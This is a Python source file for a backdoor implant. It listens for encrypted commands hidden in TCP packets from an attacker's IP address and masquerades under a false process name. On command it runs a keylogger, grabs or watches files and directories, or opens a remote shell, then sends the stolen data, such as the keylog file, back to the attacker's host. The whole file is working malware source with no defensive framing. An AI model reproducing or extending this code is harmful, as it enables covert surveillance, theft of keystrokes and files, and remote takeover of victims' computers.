#!/usr/bin/env python3


from scapy.all import *
from multiprocessing import Process
import sys, argparse, setproctitle
import encryption as encryption
import keylog as keylogger
import watchfile as watchfile
import watchdir as watchdir
import getfile as getfile
import rshell as rshell


# Parse command-line arguments
parser = argparse.ArgumentParser()

parser.add_argument("-a",
                    "--attacker",
                    type=str,
                    help="IP of remote attacker",
                    required=True)

parser.add_argument("-m",
                    "--masq",
                    type=str,
                    help="Process name of this app, to masquerade as",
                    required=False)      

global parseargs
parseargs = parser.parse_args()

# Masquerade this app's process name, if provided
if parseargs.masq is not None:
    setproctitle.setproctitle(parseargs.masq)

is_running = False
process_list = []


def read_pkt(packet):
    global is_running

    payload = packet[Raw].load.decode("utf-8")
    payload_split = payload.split("|")

    data = ""

    # Additional data in payload (e.g., filenames)
    if len(payload_split) > 2:
        data = payload_split[1]
        data = encryption.decrypt_data(data.encode("utf-8"))
        data = data.decode("utf-8")

    # Parse functionality from attacker
    func = payload_split[0]
    func = encryption.decrypt_data(func.encode("utf-8"))
    func = func.decode("utf-8")

    if func == "quit":
        print("Shutdown signal received - exiting...")
        sys.exit()
    else:
        exec_function(func, data)


def send_file(mode, filename, chunks):
    with open(filename) as file:
        data = file.read()

    encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
    encrypted_data = encrypted_data.decode("utf-8")

    parts = [encrypted_data[i:i+chunks] for i in range(0, len(encrypted_data), chunks)]
    parts[-1] += ("$EOF" + mode)

    for part in parts:
        pkt = IP(dst=parseargs.attacker)/TCP(sport=RandShort(), dport=8500)/part.encode("utf-8")
        send(pkt, verbose=False)


def exec_function(mode, *args):
    global is_running
    global process_list

    # Start functions
    if is_running == False:
        if mode == "keylog":
            print("Activate: ", mode)
            is_running = True

            keylogger.start_keylogger()
        
        elif mode == "getfile":
            print("Activate: ", mode)
            is_running = True

            filepath = args[0]
            getfile_process = Process(target=getfile.get_file, args=(filepath,parseargs.attacker,))
            process_list.append(getfile_process)
            process_list[0].start()

        elif mode == "watchfile":
            print("Activate: ", mode)
            is_running = True

            filename = args[0]
            watchfile_process = Process(target=watchfile.start_watchfile, args=(filename,parseargs.attacker,))
            process_list.append(watchfile_process)
            process_list[0].start()

        elif mode == "watchdir":
            print("Activate: ", mode)
            is_running = True

            dirname = args[0]
            watchdir_process = Process(target=watchdir.start_watchdir, args=(dirname,parseargs.attacker,))
            process_list.append(watchdir_process)
            process_list[0].start()

        elif mode == "rshell":
            print("Activate: ", mode)
            is_running = True

            command = args[0]
            rshell_process = Process(target=rshell.exec_command, args=(command,parseargs.attacker,))
            process_list.append(rshell_process)
            process_list[0].start()

        else:
            return

    # Stop functions
    elif is_running == True:
        if mode == "keylog":
            print("Stop: ", mode)
            is_running = False

            # Stop keylogger, and send log to attacker
            keylogger.stop_keylogger()
            send_file(mode, "keylog.txt", 1000)

        elif mode == "getfile":
            print("Stop: ", mode)
            is_running = False

            # Terminate process and remove from processes list
            process_list[0].terminate()
            process_list.pop(0)

        if mode == "watchfile":
            print("Stop: ", mode)
            is_running = False

            # Terminate process and remove from processes list
            process_list[0].terminate()
            process_list.pop(0)

        if mode == "watchdir":
            print("Stop: ", mode)
            is_running = False

            # Terminate process and remove from processes list
            process_list[0].terminate()
            process_list.pop(0)

        if mode == "rshell":
            print("Stop: ", mode)
            is_running = False

            # Terminate process and remove from processes list
            process_list[0].terminate()
            process_list.pop(0)

        else:
            return


def main():
    print("Listening...\n")

    while True:
        sniff(filter=f"ip and tcp and host {parseargs.attacker} and dst port 8505", prn=read_pkt)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
